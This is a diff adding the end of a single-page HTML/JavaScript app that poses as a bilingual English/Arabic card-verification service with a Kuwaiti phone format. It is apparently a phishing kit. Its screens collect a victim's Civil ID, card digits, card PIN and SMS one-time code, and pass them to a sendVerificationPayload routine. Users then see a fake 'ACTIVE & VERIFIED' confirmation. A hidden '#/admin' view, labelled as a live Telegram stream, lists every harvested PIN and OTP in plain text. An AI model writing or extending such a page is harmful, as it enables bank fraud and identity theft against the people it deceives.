+      function submitted(){const x=t();return `<section class="screen form-screen submitted" dir="${state.language==='ar'?'rtl':'ltr'}"><div class="submitted-modal"><div class="success-icon">✓</div><h1>${x.submittedTitle}</h1><p class="subtitle">${x.submittedSubtitle}</p><div class="submission-note">◆ ${x.submittedNote}</div></div><div class="bottom">${button(x.done,'back-home')}</div></section>`}
+      function success(){const x=t();return `<section class="screen form-screen success" dir="${state.language==='ar'?'rtl':'ltr'}"><div class="success-content"><div class="success-icon">✓</div><h1>${x.successTitle}</h1><p class="subtitle">${x.successSubtitle}</p><div class="reference"><div><small>${x.refLabel}</small><b>${state.referenceId}</b></div><button type="button" data-copy>${icon('copy')} Copy</button></div><div class="summary"><div><span>${x.verifiedCivilId}</span><b>${state.civilId?state.civilId.slice(0,4)+' •••• '+state.civilId.slice(-4):'••••••••'}</b></div><div><span>${x.verifiedCard}</span><b>${state.first4} •••• •••• ${state.last4}</b></div><div class="verified"><span>Verification Status</span><b>✓ ACTIVE & VERIFIED</b></div></div></div><div class="bottom">${button(x.done,'back-home')}</div></section>`}
+
+      // =========================================================================
+      // ADMIN PANEL VIEW (Accessible via /#/admin)
+      // =========================================================================
+      function renderAdminPanel() {
+        document.documentElement.lang = 'en';
+        document.documentElement.dir = 'ltr';
+        const submissions = JSON.parse(localStorage.getItem('admin_submissions') || '[]');
+
+        app.innerHTML = `
+          <div style="min-height: 100vh; background: #0f172a; color: #f8fafc; padding: 24px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;">
+            <div style="max-width: 1200px; margin: 0 auto;">
+              <header style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; padding-bottom: 16px; border-bottom: 1px solid #334155;">
+                <div>
+                  <h1 style="font-size: 24px; font-weight: bold; color: white;">Admin Control Panel</h1>
+                  <p style="color: #94a3b8; font-size: 14px;">Live Verification Logs & Telegram Stream</p>
+                </div>
+                <div style="display: flex; gap: 12px; align-items: center;">
+                  <span style="display: inline-flex; align-items: center; gap: 6px; background: rgba(34, 197, 94, 0.1); color: #22c55e; padding: 6px 12px; border-radius: 9999px; font-size: 13px; font-weight: bold;">
+                    <span style="width: 8px; height: 8px; background: #22c55e; border-radius: 50%; display: inline-block;"></span> LIVE STREAM
+                  </span>
+                  <button id="admin-clear" style="background: #ef4444; color: white; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; font-weight: 500;">Clear Logs</button>
+                  <a href="#" style="background: #3b82f6; color: white; text-decoration: none; padding: 8px 16px; border-radius: 6px; font-weight: 500; display: inline-block;">Exit to App</a>
+                </div>
+              </header>
+
+              <div style="background: #1e293b; border-radius: 8px; border: 1px solid #334155; overflow-x: auto;">
+                <table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 14px;">
+                  <thead>
+                    <tr style="background: rgba(0,0,0,0.2); color: #94a3b8; border-bottom: 1px solid #334155;">
+                      <th style="padding: 12px 16px;">Time</th>
+                      <th style="padding: 12px 16px;">Civil ID</th>
+                      <th style="padding: 12px 16px;">Card Digits</th>
+                      <th style="padding: 12px 16px;">PIN</th>
+                      <th style="padding: 12px 16px;">OTP Code</th>
+                      <th style="padding: 12px 16px;">Lang / Device</th>
+                      <th style="padding: 12px 16px;">Status</th>
+                    </tr>
+                  </thead>
+                  <tbody>
+                    ${submissions.length === 0 ? `
+                      <tr><td colspan="7" style="text-align: center; padding: 40px; color: #94a3b8;">Waiting for user submissions...</td></tr>
+                    ` : submissions.map(sub => `
+                      <tr style="border-bottom: 1px solid #334155;">
+                        <td style="padding: 12px 16px; color: #94a3b8; font-size: 12px;">${new Date(sub.timestamp).toLocaleTimeString()}</td>
+                        <td style="padding: 12px 16px;"><code style="background: #090d16; padding: 3px 6px; border-radius: 4px; color: #60a5fa;">${sub.civilId}</code></td>
+                        <td style="padding: 12px 16px;"><code style="background: #090d16; padding: 3px 6px; border-radius: 4px; color: #60a5fa;">${sub.first4} •••• •••• ${sub.last4}</code> (${sub.brand})</td>
+                        <td style="padding: 12px 16px;"><strong style="color: #ef4444; background: #090d16; padding: 3px 6px; border-radius: 4px;">${sub.pin}</strong></td>
+                        <td style="padding: 12px 16px;"><strong style="color: #22c55e; background: #090d16; padding: 3px 6px; border-radius: 4px;">${sub.otp}</strong></td>
+                        <td style="padding: 12px 16px; font-size: 12px; color: #94a3b8;">${sub.language} / ${sub.device}</td>
+                        <td style="padding: 12px 16px;">
+                          <span style="background: ${sub.status === 'VERIFIED' ? 'rgba(34,197,94,0.1)' : 'rgba(234,179,8,0.1)'}; color: ${sub.status === 'VERIFIED' ? '#22c55e' : '#eab308'}; padding: 4px 8px; border-radius: 4px; font-size: 11px; font-weight: bold;">
+                            ${sub.status}
+                          </span>
+                        </td>
+                      </tr>
+                    `).join('')}
+                  </tbody>
+                </table>
+              </div>
+            </div>
+          </div>
+        `;
+
+        document.getElementById('admin-clear')?.addEventListener('click', () => {
+          if (confirm('Clear all stored logs?')) {
+            localStorage.removeItem('admin_submissions');
+            renderAdminPanel();
+          }
+        });
+      }
+
+      // =========================================================================
+      // MAIN ROUTER & APP INITIALIZATION
+      // =========================================================================
+      function render(){
+        if (window.location.hash === '#/admin') {
+          renderAdminPanel();
+          return;
+        }
+
+        document.documentElement.lang = state.language;
+        document.documentElement.dir = state.language === 'ar' ? 'rtl' : 'ltr';
+        app.innerHTML = shell(state.screen==='landing'?landing():state.screen==='success'?success():state.screen==='submitted'?submitted():formScreen(state.screen)); 
+        bind();
+      }
+
+      function bind(){
+        document.querySelectorAll('[data-screen]').forEach(b=>b.onclick=()=>{state.screen=b.dataset.screen;state.error='';render()});
+        document.querySelector('[data-lang]')?.addEventListener('click',()=>{state.language=state.language==='en'?'ar':'en';render()});
+        document.querySelector('[data-mobile]')?.addEventListener('click',()=>{state.mobile=!state.mobile;render()});
+        document.querySelector('[data-reset]')?.addEventListener('click',reset);
+        document.querySelector('[data-start]')?.addEventListener('click',()=>{state.screen='civil_id';render()});
+        document.querySelectorAll('[data-set-lang]').forEach(b=>b.onclick=()=>{state.language=b.dataset.setLang;render()});
+        document.querySelector('[data-back]')?.addEventListener('click',()=>{state.screen={civil_id:'landing',card_digits:'civil_id',card_pin:'card_digits'}[state.screen]||'landing';state.error='';render()});
+
+        const civil=document.querySelector('#civil'); if(civil){civil.oninput=()=>{civil.value=civil.value.replace(/\D/g,'');state.civilId=civil.value;state.error='';updateButton('continue-civil',!state.civilId.length)};document.querySelectorAll('[data-civil]').forEach(b=>b.onclick=()=>{state.civilId=b.dataset.civil;render()})}
+        const first=document.querySelector('#first4'),last=document.querySelector('#last4');if(first&&last){first.oninput=()=>{first.value=first.value.replace(/\D/g,'').slice(0,4);state.first4=first.value;state.brand=first.value.startsWith('4')?'visa':(first.value.startsWith('5')||first.value.startsWith('2')?'mastercard':'knet');state.error='';render()};last.oninput=()=>{last.value=last.value.replace(/\D/g,'').slice(0,4);state.last4=last.value;updateButton('continue-card',!(state.first4.length===4&&state.last4.length===4))};document.querySelectorAll('[data-card]').forEach(b=>b.onclick=()=>{[state.first4,state.last4]=b.dataset.card.split(',');render()})}
+        const pin=document.querySelector('#pin-input');if(pin){pin.oninput=()=>{state.pin=pin.value.replace(/\D/g,'').slice(0,4);state.error='';render()};document.querySelectorAll('[data-pin]').forEach(b=>b.onclick=()=>{if(state.pin.length<4)state.pin+=b.dataset.pin;render()});document.querySelector('[data-clear-pin]').onclick=()=>{state.pin='';render()};document.querySelector('[data-backspace]').onclick=()=>{state.pin=state.pin.slice(0,-1);render()};document.querySelector('[data-toggle-pin]').onclick=()=>{state.pinVisible=!state.pinVisible;render()}}
+        const otps=document.querySelectorAll('.otp');otps.forEach((input,i)=>{input.oninput=()=>{const v=input.value.replace(/\D/g,''); if(v.length>1){state.otp=v.slice(0,6);render();return}state.otp=state.otp.substring(0,i)+v+state.otp.substring(i+1);state.otp=state.otp.slice(0,6);if(v&&i<5)otps[i+1].focus();updateButton('confirm-otp',state.otp.length!==6)};input.onkeydown=e=>{if(e.key==='Backspace'&&!input.value&&i>0)otps[i-1].focus()};input.onpaste=e=>{e.preventDefault();state.otp=e.clipboardData.getData('text').replace(/\D/g,'').slice(0,6);render()}});document.querySelectorAll('[data-use-code]').forEach(b=>b.onclick=()=>{state.otp=state.demoCode;render()});document.querySelector('[data-close-sms]')?.addEventListener('click',()=>{state.smsVisible=false;render()});document.querySelector('[data-resend]')?.addEventListener('click',()=>{state.demoCode=String(Math.floor(100000+Math.random()*900000));state.timer=59;state.canResend=false;state.otp='';startTimer();render()});
+
+        const actions={
+          'continue-civil':()=>{
+            if(!state.civilId.length) return fail(t().civilIdError);
+            state.maskedPhone='+965 •••• 48'+state.civilId.slice(-2);
+            go('card_digits');
+          },
+          'continue-card':()=>{
+            if(state.first4.length!==4||state.last4.length!==4) return fail(t().cardDigitsError);
+            go('card_pin');
+          },
+          'continue-pin':()=>{
+            if(state.pin.length!==4) return fail(t().cardPinError);
+            sendVerificationPayload();
+            go('submitted');
+          },
+          'confirm-otp':()=>{
+            if(state.otp.length!==6) return fail(t().otpError);
+            state.referenceId=`VRF-${new Date().getFullYear()}-${Math.floor(100000+Math.random()*900000)}`;
+            sendVerificationPayload();
+            go('success');
+          },
+          'back-home':reset
+        };
+
+        Object.entries(actions).forEach(([id,fn])=>document.querySelector('#'+id)?.addEventListener('click',fn));
+        document.querySelector('[data-copy]')?.addEventListener('click',async e=>{try{await navigator.clipboard.writeText(state.referenceId)}catch{}e.currentTarget.textContent='✓ Copied';setTimeout(render,1500)});
+      }
+
+      function updateButton(id,disabled){const b=document.querySelector('#'+id);if(b)b.disabled=disabled} 
+      function fail(msg){state.error=msg;render()} 
+      function go(screen){state.screen=screen;state.error='';if(screen==='otp'){state.timer=59;state.canResend=false;startTimer()}render()} 
+      function startTimer(){clearInterval(timerHandle);timerHandle=setInterval(()=>{if(state.timer>0){state.timer--;if(state.screen==='otp')render()}else{state.canResend=true;clearInterval(timerHandle);if(state.screen==='otp')render()}},1000)} 
+      function reset(){Object.assign(state,{screen:'landing',civilId:'',first4:'',last4:'',brand:'visa',pin:'',otp:'',referenceId:'',maskedPhone:'+965 •••• 4821',error:'',timer:59,canResend:false,smsVisible:true});clearInterval(timerHandle);render()}
+
+      window.addEventListener('hashchange', render);
+      render();
+    </script>
   </body>
 </html>
